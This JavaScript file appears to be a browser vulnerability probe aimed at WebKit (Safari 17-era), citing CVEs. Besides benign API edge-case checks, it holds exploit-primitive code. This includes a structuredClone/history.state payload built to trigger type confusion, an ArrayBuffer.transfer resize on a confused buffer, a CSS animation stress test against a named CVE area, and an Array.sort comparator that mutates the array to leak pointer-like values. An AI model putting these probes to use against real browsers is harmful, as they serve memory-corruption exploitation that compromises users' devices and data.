// API vulnerability probe — test edge cases in WebCore/DOM/JS APIs
// WebKit 613.0 ≈ Safari 17.0 — several CVEs affect this range
(function() {
'use strict';

var results = { tests: [] };

function test(name, fn) {
  try {
    var r = fn();
    r.name = name;
    results.tests.push(r);
  } catch(e) {
    results.tests.push({ name: name, error: e.message });
  }
}

function f64ToHex(v) {
  var buf = new ArrayBuffer(8);
  new Float64Array(buf)[0] = v;
  var u = new Uint32Array(buf);
  return '0x' + u[1].toString(16).padStart(8,'0') + u[0].toString(16).padStart(8,'0');
}

// ─── Test 1: Available API surface ───
test('api_surface', function() {
  return {
    result: 'apis',
    structuredClone: typeof structuredClone,
    abTransfer: typeof ArrayBuffer.prototype.transfer,
    abResize: typeof ArrayBuffer.prototype.resize,
    abResizable: typeof ArrayBuffer.prototype.resizable,
    abTransferToFixed: typeof ArrayBuffer.prototype.transferToFixedLength,
    iterator: typeof Symbol.iterator,
    asyncIterator: typeof Symbol.asyncIterator,
    regexpMatchAll: typeof String.prototype.matchAll,
    atMethod: typeof Array.prototype.at,
    structuredCloneFunc: typeof window.structuredClone,
    requestAnimationFrame: typeof requestAnimationFrame,
    IntersectionObserver: typeof IntersectionObserver,
    MutationObserver: typeof MutationObserver,
    ResizeObserver: typeof ResizeObserver,
    indexedDB: typeof indexedDB,
    caches: typeof caches,
    crypto: typeof crypto,
    subtle: typeof (crypto && crypto.subtle),
    TextEncoder: typeof TextEncoder,
    TextDecoder: typeof TextDecoder,
    AbortController: typeof AbortController,
    ReadableStream: typeof ReadableStream,
    WritableStream: typeof WritableStream,
    CompressionStream: typeof CompressionStream,
    Proxy: typeof Proxy,
    Reflect: typeof Reflect,
    WeakMap: typeof WeakMap,
    WeakSet: typeof WeakSet
  };
});

// ─── Test 2: structuredClone() function (if available) ───
test('structuredClone_func', function() {
  if (typeof structuredClone !== 'function') return { result: 'not_available' };

  var buf = new ArrayBuffer(64);
  new Uint8Array(buf).fill(0xAA);
  var view = new Uint8Array(buf);

  // Test BigInt confusion via structuredClone
  var filler = [1n, buf, view, new Uint8Array(buf)];
  while (filler.length < 80) filler.push({ p: filler.length });
  var ref = {};
  var outer = new Array(83);
  outer[0] = filler;
  outer[1] = ref;
  outer[2] = ref;
  outer[82] = -1;

  var c = structuredClone(outer);
  if (!c) return { result: 'null' };

  var cv = c[0][3];
  if (!(cv instanceof Uint8Array)) return { result: 'not_u8', type: typeof cv };

  return {
    result: cv[0] === 0xAA ? 'CONFUSED' : 'normal',
    byte0: cv[0],
    mismatch: c[1] !== c[2]
  };
});

// ─── Test 3: ArrayBuffer.transfer (if available) ───
test('ab_transfer', function() {
  if (typeof ArrayBuffer.prototype.transfer !== 'function') return { result: 'not_available' };

  var buf = new ArrayBuffer(64);
  new Uint8Array(buf).fill(0xBB);
  var view = new Uint8Array(buf);

  var buf2 = buf.transfer();

  return {
    result: 'transferred',
    origLen: buf.byteLength,
    newLen: buf2.byteLength,
    viewLen: view.byteLength,
    viewByte0: view.byteLength > 0 ? view[0] : 'detached',
    newByte0: new Uint8Array(buf2)[0]
  };
});

// ─── Test 4: ArrayBuffer.transfer + SC confusion ───
test('transfer_confusion', function() {
  if (typeof ArrayBuffer.prototype.transfer !== 'function') return { result: 'not_available' };

  var target = new ArrayBuffer(64);
  new Uint8Array(target).fill(0xCC);
  var source = new ArrayBuffer(64);
  new Uint8Array(source).fill(0xDD);
  var v1 = new Uint8Array(source);
  var v2 = new Uint8Array(source);

  // Get a confused view
  var filler = [1n, target, v1, v2];
  while (filler.length < 80) filler.push({ p: filler.length });
  var ref = {};
  var outer = new Array(83);
  outer[0] = filler;
  outer[1] = ref;
  outer[2] = ref;
  outer[82] = -1;

  history.replaceState(outer, '');
  var c = history.state;
  history.replaceState(null, '');
  if (!c) return { result: 'null' };

  var cv = c[0][3];
  if (!(cv instanceof Uint8Array) || cv[0] !== 0xCC) return { result: 'no_confusion' };

  // Now transfer the confused view's underlying buffer
  var originalBuf = cv.buffer;
  try {
    var transferred = originalBuf.transfer(128); // Transfer and resize!
    return {
      result: 'transfer_resize',
      origLen: originalBuf.byteLength,
      newLen: transferred.byteLength,
      cvLen: cv.byteLength,
      cvByte0: cv.byteLength > 0 ? cv[0] : 'detached',
      newByte0: new Uint8Array(transferred)[0],
      newByte64: transferred.byteLength > 64 ? new Uint8Array(transferred)[64] : 'n/a'
    };
  } catch(e) {
    return { result: 'transfer_error', msg: e.message };
  }
});

// ─── Test 5: CSS animation trigger (CVE-2023-42917 area) ───
test('css_animation', function() {
  var div = document.createElement('div');
  document.body.appendChild(div);

  var style = document.createElement('style');
  style.textContent = [
    '@keyframes test1 { 0% { transform: scale(1); } 100% { transform: scale(2); } }',
    '@keyframes test2 { 0% { opacity: 0; } 50% { opacity: 1; } 100% { opacity: 0; } }',
    '.anim-target { animation: test1 0.001s linear infinite, test2 0.001s linear infinite; }',
    '.anim-complex { animation: test1 0.001s steps(1000) infinite; transform-origin: 0 0; }'
  ].join('\n');
  document.head.appendChild(style);

  div.className = 'anim-target';
  div.style.width = '100px';
  div.style.height = '100px';

  // Force layout
  div.offsetWidth;

  // Create many animated elements rapidly
  var anims = [];
  for (var i = 0; i < 50; i++) {
    var el = document.createElement('div');
    el.className = 'anim-complex';
    el.style.width = (i + 1) + 'px';
    el.style.height = (i + 1) + 'px';
    document.body.appendChild(el);
    anims.push(el);
  }

  // Force layout recalc
  document.body.offsetWidth;

  // Remove them while animating
  for (var i = 0; i < anims.length; i++) {
    anims[i].remove();
  }
  div.remove();
  style.remove();

  return { result: 'survived', count: anims.length };
});

// ─── Test 6: RegExp engine edge cases ───
test('regexp_edge', function() {
  var results_inner = {};

  // Deep backreference
  try {
    var re = new RegExp('(a)'.repeat(100) + '\\100');
    results_inner.deepBackref = re.test('a'.repeat(100) + 'a') ? 'matched' : 'no_match';
  } catch(e) { results_inner.deepBackref = 'err:' + e.message.substring(0, 30); }

  // Large quantifier
  try {
    var re2 = /a{0,2147483647}/;
    results_inner.largeQuant = re2.test('aaa') ? 'ok' : 'no';
  } catch(e) { results_inner.largeQuant = 'err:' + e.message.substring(0, 30); }

  // Named groups with special chars
  try {
    var re3 = /(?<_a>test)/;
    var m = re3.exec('test');
    results_inner.namedGroup = m && m.groups ? Object.keys(m.groups)[0] : 'no_match';
  } catch(e) { results_inner.namedGroup = 'err:' + e.message.substring(0, 30); }

  // Lookbehind with variable length (complex for regex engine)
  try {
    var re4 = /(?<=a{1,100})b/;
    results_inner.lookbehind = re4.test('aaab') ? 'ok' : 'no';
  } catch(e) { results_inner.lookbehind = 'err:' + e.message.substring(0, 30); }

  // matchAll with capturing groups
  try {
    var iter = 'aababab'.matchAll(/(a)(b)/g);
    var count = 0;
    for (var m of iter) count++;
    results_inner.matchAll = count;
  } catch(e) { results_inner.matchAll = 'err:' + e.message.substring(0, 30); }

  // RegExp lastIndex manipulation
  try {
    var re5 = /a/g;
    re5.lastIndex = 2147483647;
    var m2 = re5.exec('a');
    results_inner.lastIndexOverflow = m2 ? 'matched' : 'null';
    re5.lastIndex = -1;
    var m3 = re5.exec('a');
    results_inner.lastIndexNeg = m3 ? 'matched' : 'null';
  } catch(e) { results_inner.lastIndexEdge = 'err:' + e.message.substring(0, 30); }

  // String.replace with function and backreferences
  try {
    var replaced = 'hello'.replace(/(.)(.)(.)(.)(.)/, function(m, a, b, c, d, e, off, str) {
      return arguments.length + '_' + (typeof arguments[7]);
    });
    results_inner.replaceFn = replaced;
  } catch(e) { results_inner.replaceFn = 'err'; }

  return { result: 'regexp', data: results_inner };
});

// ─── Test 7: Canvas 2D edge cases ───
test('canvas_edge', function() {
  var c = document.createElement('canvas');
  c.width = 1; c.height = 1;
  var ctx = c.getContext('2d');
  if (!ctx) return { result: 'no_canvas' };

  var results_inner = {};

  // Get/put ImageData at boundaries
  try {
    c.width = 4; c.height = 4;
    var id = ctx.getImageData(0, 0, 4, 4);
    new Uint8Array(id.data.buffer).fill(0xFF);
    ctx.putImageData(id, -2, -2); // negative offset
    var id2 = ctx.getImageData(0, 0, 4, 4);
    results_inner.negOffset = id2.data[0] === 0xFF ? 'written' : 'clipped_' + id2.data[0];
  } catch(e) { results_inner.negOffset = 'err:' + e.message.substring(0, 40); }

  // Very large canvas dimensions
  try {
    var big = document.createElement('canvas');
    big.width = 65536;
    big.height = 1;
    var bctx = big.getContext('2d');
    results_inner.bigCanvas = bctx ? 'ok_' + big.width : 'no_ctx';
    big.width = 1; // reset
  } catch(e) { results_inner.bigCanvas = 'err:' + e.message.substring(0, 40); }

  // createImageData with edge values
  try {
    var id3 = ctx.createImageData(1, 1);
    results_inner.createID = id3.data.length;
  } catch(e) { results_inner.createID = 'err'; }

  // drawImage from one canvas to another
  try {
    var c2 = document.createElement('canvas');
    c2.width = 2; c2.height = 2;
    var ctx2 = c2.getContext('2d');
    ctx2.fillStyle = '#FF0000';
    ctx2.fillRect(0, 0, 2, 2);
    ctx.drawImage(c2, 0, 0);
    results_inner.drawImage = 'ok';
  } catch(e) { results_inner.drawImage = 'err'; }

  // toDataURL
  try {
    results_inner.toDataURL = c.toDataURL('image/png').substring(0, 30);
  } catch(e) { results_inner.toDataURL = 'err:' + e.message.substring(0, 30); }

  return { result: 'canvas', data: results_inner };
});

// ─── Test 8: SVG + foreignObject for DOM confusion ───
test('svg_foreign', function() {
  try {
    var svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
    svg.setAttribute('width', '100');
    svg.setAttribute('height', '100');

    var fo = document.createElementNS('http://www.w3.org/2000/svg', 'foreignObject');
    fo.setAttribute('width', '100');
    fo.setAttribute('height', '100');

    var div = document.createElement('div');
    div.textContent = 'test';
    fo.appendChild(div);
    svg.appendChild(fo);
    document.body.appendChild(svg);

    // Force render
    svg.getBBox();

    // Manipulate during render
    var rect = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
    rect.setAttribute('width', '50');
    rect.setAttribute('height', '50');
    rect.setAttribute('fill', 'red');
    svg.appendChild(rect);

    // SVG filter
    var filter = document.createElementNS('http://www.w3.org/2000/svg', 'filter');
    filter.id = 'testFilter';
    var feGaussian = document.createElementNS('http://www.w3.org/2000/svg', 'feGaussianBlur');
    feGaussian.setAttribute('stdDeviation', '5');
    filter.appendChild(feGaussian);
    svg.appendChild(filter);
    rect.setAttribute('filter', 'url(#testFilter)');

    svg.getBBox();
    svg.remove();

    return { result: 'svg_ok' };
  } catch(e) {
    return { result: 'svg_err', msg: e.message.substring(0, 80) };
  }
});

// ─── Test 9: TextEncoder/TextDecoder edge cases ───
test('text_codec', function() {
  if (typeof TextEncoder === 'undefined') return { result: 'not_available' };

  var results_inner = {};

  // Encode surrogate pairs
  try {
    var enc = new TextEncoder();
    var dec = new TextDecoder();
    var encoded = enc.encode('𐀀'); // Valid surrogate pair
    results_inner.surrogatePair = encoded.length + '_' + dec.decode(encoded);
  } catch(e) { results_inner.surrogatePair = 'err'; }

  // Lone surrogates
  try {
    var enc2 = new TextEncoder();
    var encoded2 = enc2.encode('\uD800'); // Lone high surrogate
    results_inner.loneSurrogate = encoded2.length;
  } catch(e) { results_inner.loneSurrogate = 'err'; }

  // Decode with fatal=true
  try {
    var dec2 = new TextDecoder('utf-8', { fatal: true });
    dec2.decode(new Uint8Array([0xFF, 0xFE])); // Invalid UTF-8
    results_inner.fatal = 'no_throw';
  } catch(e) { results_inner.fatal = 'threw'; }

  // Decode with stream=true, split multi-byte
  try {
    var dec3 = new TextDecoder('utf-8');
    var part1 = dec3.decode(new Uint8Array([0xE4, 0xB8]), { stream: true }); // First 2 bytes of 3-byte char
    var part2 = dec3.decode(new Uint8Array([0xAD])); // Last byte
    results_inner.stream = part1.length + '_' + part2.length + '_' + part2;
  } catch(e) { results_inner.stream = 'err'; }

  return { result: 'text_codec', data: results_inner };
});

// ─── Test 10: Intl API edge cases ───
test('intl_edge', function() {
  var results_inner = {};

  try {
    var nf = new Intl.NumberFormat('en', { maximumFractionDigits: 350 });
    results_inner.bigFractionDigits = nf.format(1.23456789) ? 'ok' : 'empty';
  } catch(e) { results_inner.bigFractionDigits = 'err:' + e.message.substring(0, 40); }

  try {
    var nf2 = new Intl.NumberFormat('en', { style: 'currency', currency: 'USD' });
    results_inner.currency = nf2.format(Number.MAX_SAFE_INTEGER);
  } catch(e) { results_inner.currency = 'err'; }

  try {
    var dtf = new Intl.DateTimeFormat('en', { timeZone: 'UTC' });
    results_inner.dateFormat = dtf.format(new Date(0));
  } catch(e) { results_inner.dateFormat = 'err'; }

  try {
    var col = new Intl.Collator('en', { sensitivity: 'base' });
    results_inner.collator = col.compare('a', 'A');
  } catch(e) { results_inner.collator = 'err'; }

  return { result: 'intl', data: results_inner };
});

// ─── Test 11: Array.prototype.sort type confusion ───
// sort() with a comparator that mutates the array during sorting
test('sort_confusion', function() {
  var callCount = 0;
  var leaked = [];

  var arr = [];
  for (var i = 0; i < 64; i++) arr.push(i + 0.5);

  var target = { secret: 42 };

  arr.sort(function(a, b) {
    callCount++;
    if (callCount === 20) {
      // Mutate during sort — inject object into double array
      arr[0] = target;
      arr[1] = target;
      arr[32] = target;
    }
    if (callCount > 20 && typeof a === 'number') {
      var hex = f64ToHex(a);
      if (hex !== '0x0000000000000000' &&
          !hex.startsWith('0x40') &&
          !hex.startsWith('0x3f')) {
        leaked.push({ call: callCount, hex: hex, val: a });
      }
    }
    return a - b;
  });

  // Check result array for pointer-like values
  var postSort = [];
  for (var i = 0; i < Math.min(10, arr.length); i++) {
    if (typeof arr[i] === 'number') {
      postSort.push({ i: i, hex: f64ToHex(arr[i]) });
    } else {
      postSort.push({ i: i, type: typeof arr[i] });
    }
  }

  return {
    result: leaked.length > 0 ? 'LEAK' : 'no_leak',
    calls: callCount,
    leaked: leaked.slice(0, 5),
    postSort: postSort
  };
});

// ─── Test 12: Proxy + Reflect edge cases ───
test('proxy_reflect', function() {
  var results_inner = {};

  // Proxy with invariant violations
  try {
    var obj = {};
    Object.defineProperty(obj, 'x', { value: 42, writable: false, configurable: false });
    var p = new Proxy(obj, {
      get: function(t, prop) {
        if (prop === 'x') return 99; // Violates non-configurable invariant
        return t[prop];
      }
    });
    results_inner.invariantViolation = p.x;
  } catch(e) {
    results_inner.invariantViolation = 'threw:' + e.message.substring(0, 40);
  }

  // Reflect.construct with new.target manipulation
  try {
    function F() { this.x = 1; }
    function G() {}
    G.prototype = { marker: true };
    var obj2 = Reflect.construct(F, [], G);
    results_inner.reflectConstruct = obj2.x + '_' + obj2.marker;
  } catch(e) { results_inner.reflectConstruct = 'err'; }

  // Proxy getPrototypeOf returning non-object
  try {
    var p2 = new Proxy({}, {
      getPrototypeOf: function() { return null; }
    });
    results_inner.protoNull = Object.getPrototypeOf(p2) === null;
  } catch(e) { results_inner.protoNull = 'err'; }

  return { result: 'proxy', data: results_inner };
});

return JSON.stringify(results);
})();
